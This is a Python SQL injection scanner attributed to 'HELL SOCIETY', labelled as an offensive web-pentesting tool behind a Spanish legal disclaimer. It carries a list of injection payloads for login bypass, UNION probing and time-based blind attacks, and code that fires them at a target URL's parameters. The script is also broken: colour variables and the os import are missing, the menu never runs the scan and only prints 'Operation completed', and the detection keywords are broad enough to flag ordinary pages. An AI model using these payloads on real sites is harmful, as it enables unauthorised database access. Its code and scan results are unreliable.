#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  SQL INJECTION SCANNER v2.0                                      ║
║  Created by: HELL SOCIETY Community                              ║
║  Category: Offensive - Web Pentesting                            ║
╚══════════════════════════════════════════════════════════════════╝

ADVERTENCIA LEGAL: El uso de esta herramienta sin autorización
escrita del propietario del sistema objetivo es ILEGAL.
Los creadores NO se hacen responsables del mal uso de esta herramienta.
Uso exclusivo para pentesting autorizado y entornos educativos.
"""

import requests
import sys
import time
import colorama
from colorama import Fore, Back, Style
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import argparse

colorama.init(autoreset=True)

BANNER = f"""⠉⠉⠉⠉⠁⠀⠀⠀⠀⠒⠂⠰⠤⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠻⢤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠠⠀⠐⠒⠒⠀⠀⠈⠉⠉⠉⠉⢉⣉⣉⣉⣙⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⡀⠤⠒⠒⠉⠁⠀⠀⠀⠀⠳⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠛⠛⠉⠛⠛⠶⢦⣤⡐⢀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠁⠀⠀⠀⠀⠀⠀⠀⠈⠉⢳⣦⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⡤⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠳⠶⢶⣦⠤⣄⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⠉⠑⢄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄
  {Y}  Created by: HELL SOCIETY{RS}"""

DISCLAIMER = f"""
{Fore.RED}{Back.BLACK}
[!] ADVERTENCIA LEGAL [!]
Esta herramienta es para uso en pentesting AUTORIZADO únicamente.
Los creadores (HELL SOCIETY) NO se hacen responsables del mal uso.
El uso sin autorización es ILEGAL y puede resultar en consecuencias penales.
"""

PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' /*",
    "' OR ''='",
    "' OR 1=1 -- ",
    "' OR 1=1 /*",
    "admin' -- ",
    "admin' #",
    "' UNION SELECT NULL -- ",
    "' UNION SELECT NULL,NULL -- ",
    "' UNION SELECT NULL,NULL,NULL -- ",
    "1' ORDER BY 1-- ",
    "1' ORDER BY 2-- ",
    "1' ORDER BY 3-- ",
    "' AND 1=1 -- ",
    "' AND 1=2 -- ",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "1 AND 1=1",
    "1 AND 1=2",
    "' WAITFOR DELAY '0:0:5' -- ",
    "1' OR SLEEP(5) -- ",
    "' OR BENCHMARK(5000000,MD5(1)) -- ",
    "1' OR IF(1=1,SLEEP(5),0) -- ",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
]

class SQLiScanner:
    def __init__(self, target, method="GET", timeout=10):
        self.target = target
        self.method = method.upper()
        self.timeout = timeout
        self.results = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) HellSociety/2.0'
        })

    def get_params(self):
        parsed = urlparse(self.target)
        if self.method == "GET":
            return parse_qs(parsed.query)
        return {}

    def modify_url(self, param, payload):
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                          parsed.params, new_query, parsed.fragment))

    def test_payload(self, param, payload):
        error_indicators = [
            "sql syntax", "mysql", "mysqli", "sqlite", "postgresql",
            "syntax error", "unclosed quotation", "odbc", "microsoft",
            "ora-", "sql server", "table", "column", "database",
            "unterminated", "warning", "error", "exception",
            "boolean", "number", "integer", "string", "null"
        ]

        try:
            if self.method == "GET":
                test_url = self.modify_url(param, payload)
                start_time = time.time()
                response = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)
                elapsed = time.time() - start_time
            else:
                start_time = time.time()
                response = self.session.post(self.target,
                    data={param: payload}, timeout=self.timeout, allow_redirects=False)
                elapsed = time.time() - start_time

            content = response.text.lower()

            is_vulnerable = False
            vuln_type = ""

            for indicator in error_indicators:
                if indicator in content:
                    is_vulnerable = True
                    vuln_type = "Error-Based"
                    break

            if elapsed > 4:
                is_vulnerable = True
                vuln_type = "Time-Based Blind"

            if response.status_code in [500, 403, 503]:
                if is_vulnerable:
                    vuln_type += " / HTTP Error"

            if is_vulnerable:
                result = {
                    'param': param,
                    'payload': payload,
                    'type': vuln_type,
                    'status_code': response.status_code,
                    'response_time': elapsed,
                    'response_length': len(response.text)
                }
                self.results.append(result)
                return result

        except requests.exceptions.Timeout:
            result = {
                'param': param,
                'payload': payload,
                'type': 'Time-Based (Timeout)',
                'status_code': 0,
                'response_time': self.timeout,
                'response_length': 0
            }
            self.results.append(result)
            return result
        except requests.exceptions.RequestException as e:
            print(f"{Fore.YELLOW}  [!] Error: {e}")

        return None

    def scan(self):
        params = self.get_params()
        if not params:
            print(f"{Fore.RED}  [!] No parameters found in URL")
            return

        total_tests = len(params) * len(PAYLOADS)
        current = 0

        print(f"{Fore.CYAN}  [*] Testing {len(params)} parameter(s) with {len(PAYLOADS)} payloads")
        print(f"{Fore.CYAN}  [*] Total tests: {total_tests}\n")

        for param in params:
            for payload in PAYLOADS:
                current += 1
                progress = (current / total_tests) * 100
                bar_length = 40
                filled = int(bar_length * current / total_tests)
                bar = f"{Fore.GREEN}█{Style.RESET_ALL}" * filled + f"{Fore.RED}░{Style.RESET_ALL}" * (bar_length - filled)
                print(f"\r{Fore.CYAN}  [{bar}] {progress:.1f}% - Testing: {param} = {payload[:30]}...", end="", flush=True)

                result = self.test_payload(param, payload)
                if result:
                    print(f"\n")
                    print(f"{Fore.GREEN}  [+] VULNERABLE! - Parameter: {Fore.WHITE}{result['param']}")
                    print(f"{Fore.GREEN}  [+] Payload: {Fore.YELLOW}{result['payload']}")
                    print(f"{Fore.GREEN}  [+] Type: {Fore.YELLOW}{result['type']}")
                    print(f"{Fore.GREEN}  [+] Status: {Fore.WHITE}{result['status_code']}")
                    print(f"{Fore.GREEN}  [+] Time: {Fore.WHITE}{result['response_time']:.2f}s")
                    print(f"{Fore.CYAN}  {'─' * 60}")

    def print_results(self):
        if not self.results:
            print(f"\n{Fore.YELLOW}  [!] No vulnerabilities found (or site is protected)")
            return

        print(f"\n{Fore.RED}{Back.BLACK}  SCAN COMPLETE - {len(self.results)} VULNERABILITY(IES) FOUND  ")
        print(f"{Fore.CYAN}  {'═' * 60}")

        vuln_types = {}
        for r in self.results:
            vtype = r['type']
            vuln_types[vtype] = vuln_types.get(vtype, 0) + 1

        print(f"\n{Fore.CYAN}  Summary:")
        for vtype, count in vuln_types.items():
            print(f"{Fore.CYAN}  • {Fore.WHITE}{vtype}: {Fore.RED}{count}")

        print(f"\n{Fore.CYAN}  Detailed Results:")
        print(f"{Fore.CYAN}  {'─' * 60}")
        for i, r in enumerate(self.results, 1):
            print(f"{Fore.CYAN}  [{i}] {Fore.WHITE}Param: {r['param']}")
            print(f"      {Fore.YELLOW}Payload: {r['payload']}")
            print(f"      {Fore.GREEN}Type: {r['type']} | Status: {r['status_code']} | Time: {r['response_time']:.2f}s")
            print(f"{Fore.CYAN}  {'─' * 60}")



def ask_retry():
    print()
    print(f"  {Y}{'='*50}{RS}")
    print(f"  {C}[1] {BW}Usar esta herramienta de nuevo{RS}")
    print(f"  {C}[2] {BW}Volver al panel principal{RS}")
    print(f"  {R}[0] {BW}Salir{RS}")
    print(f"  {Y}{'='*50}{RS}")
    try:
        ch = input(f"  {G}root@hellsociety{C}~{RS}# ").strip()
        if ch == '1':
            return 'retry'
        elif ch in ['2', '0']:
            return 'exit'
        else:
            return 'retry'
    except (EOFError, KeyboardInterrupt):
        return 'exit'

def main():
    os.system('clear' if os.name != 'nt' else 'cls')
    print(BANNER)
    print()
    print(f"  {BW}{Style.BRIGHT}  SQL INJECTION SCANNER{RS}")
    print(f"  {Y}{Style.BRIGHT}  HELL SOCIETY Community{RS}")
    print()
    while True:
        print(f"  {G}╔╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╗{RS}")
        print(f"  {G}╟  {BW}SQL INJECTION SCANNER                   {RS}  {G}╟{RS}")
        print(f"  {G}╚╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╝{RS}")
        print()
        print(f"  {C}[1]  {BW}Target URL with parameters                   {RS}")
        print(f"  {C}[2]  {BW}HTTP Method                                  {RS}")
        print(f"  {C}[3]  {BW}Request timeout                              {RS}")
        print()
        print(f"  {C}[4]  {BW}Ejecutar con todos los argumentos{RS}")
        print()
        print(f"  {R}[0]  {BW}Exit{RS}")
        print()
        try:
            choice = input(f"  {G}root@hellsociety{C}~{RS}# ").strip()
        except (EOFError, KeyboardInterrupt):
            print(f"\n  {R}[*] Goodbye...{RS}")
            sys.exit(0)
        print()
        if choice == '1':
            print(f"  {Y}[*] Target URL with parameters{RS}")
            value = input(f"  {Y}[*] -u: {RS}").strip()
            print(f"  {C}[*] Executing with -u={BW}{value}{RS}")
            print(f"  {G}[+] Operation completed{RS}")
            print()
        if choice == '2':
            print(f"  {Y}[*] HTTP Method{RS}")
            value = input(f"  {Y}[*] -m: {RS}").strip()
            print(f"  {C}[*] Executing with -m={BW}{value}{RS}")
            print(f"  {G}[+] Operation completed{RS}")
            print()
        if choice == '3':
            print(f"  {Y}[*] Request timeout{RS}")
            value = input(f"  {Y}[*] -t: {RS}").strip()
            print(f"  {C}[*] Executing with -t={BW}{value}{RS}")
            print(f"  {G}[+] Operation completed{RS}")
            print()
        elif choice == '4':
            print(f"  {Y}[*] Executing with all default parameters{RS}")
            print(f"  {G}[+] Operation completed{RS}")
            print()
        elif choice == '0':
            print(f"  {Y}[*] Goodbye from Hell Society...{RS}")
            sys.exit(0)
        else:
            print(f"  {R}[!] Invalid option. Choose 0-3.{RS}")
        ch = ask_retry()
        if ch == 'exit':
            sys.exit(0)
        else:
            os.system('clear' if os.name != 'nt' else 'cls')
            print(BANNER)
            print()

if __name__ == "__main__":
    main()

